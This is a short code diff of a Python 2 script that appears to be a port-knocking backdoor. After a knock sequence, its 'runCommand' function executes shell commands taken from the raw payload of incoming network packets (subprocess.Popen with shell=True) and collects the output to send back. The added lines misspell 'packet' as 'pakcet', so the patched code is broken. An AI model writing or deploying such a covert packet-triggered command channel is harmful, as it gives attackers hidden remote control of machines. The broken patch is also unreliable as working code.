@@ -55,13 +55,14 @@ def knock(packet):
                 print "You suck, state = 0"
 
 def runCommand(packet):
-    data = packet['Raw'].load
-    if data.startswith(authString):
-        data = data[len(authString):]
-        print "Running command " + data
-        output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = authString + output.stdout.read() + output.stderr.read()
-        print output
+    if pakcet.haslayer(Raw):
+        data = packet['Raw'].load
+        if data.startswith(authString):
+            data = data[len(authString):]
+            print "Running command " + data
+            output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = authString + output.stdout.read() + output.stderr.read()
+            print output
 
 def main():
     while state is not 3:
